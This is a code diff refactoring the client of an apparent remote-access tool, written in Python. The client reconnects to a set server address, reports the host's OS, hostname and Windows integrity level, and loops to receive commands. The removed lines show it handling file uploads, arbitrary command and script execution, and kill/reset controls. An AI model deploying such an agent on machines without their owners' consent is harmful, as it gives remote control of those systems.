@@ -1,18 +1,15 @@
-import json
 import os
 import platform
 import socket
-import subprocess
 import sys
 import time
 
-from client.command import Command, get_command_list, execute_command
 from client.config import SERVER_ADDR
 from client.server import Server
-from common.util import logger, get_write_stream
+from common.util import logger
 
 if os.name == 'nt':
-    from client.command import INTEGRITY_LEVEL, EXECUTABLE_PATH
+    from client.command import INTEGRITY_LEVEL
 
 
 class Client:
@@ -25,51 +22,21 @@ class Client:
         while not self.server.connect(self.address):
             time.sleep(5)
         info = {
+            'type': 'info',
             'os': platform.platform(),
             'hostname': socket.gethostname(),
             'integrity': INTEGRITY_LEVEL if os.name == 'nt' else 'N/A',
             'cwd': os.getcwd(),
-            'commands': get_command_list()
         }
-        info = json.dumps(info).encode()
-        self.server.send(head={'type': 'info', 'length': len(info)}, bytes=info)
+        self.server.send(info)
         logger.info('Connected')
 
     def wait(self):
         while True:
             try:
-                head = self.server.recv_head()
-                command_id = head['id']
-                command_type = head['type']
-                result = None
-                try:
-                    if command_type == 'file':
-                        filename = head['filename']
-                        try:
-                            self.server.recv_body(head, file_stream=get_write_stream(filename))
-                            result = 1, f'File uploaded to: {os.path.abspath(filename)}'
-                        except Exception as e:
-                            self.server.recv_body(head, file_stream=get_write_stream(os.devnull))
-                            result = 0, str(e)
-                    else:
-                        command = self.server.recv_body(head)
-                        if command_type == 'command':
-                            if command == 'kill':
-                                self.server.close()
-                                sys.exit(0)
-                            elif command == 'reset':
-                                subprocess.Popen(EXECUTABLE_PATH)
-                                self.server.close()
-                                sys.exit(0)
-                            Command.server = self.server
-                            Command.id = command_id
-                            result = execute_command(command)
-                        elif command_type == 'script':
-                            result = Command.pyexec(command, json.loads(head['args']))
-                except Exception as e:
-                    result = 0, f'{e}\n'
+                result = self.server.recv_command()
                 if result:
-                    self.server.send_result(*result, id=command_id)
+                    self.server.send_result(*result)
             except SystemExit:
                 logger.info('Server closed this connection')
                 break
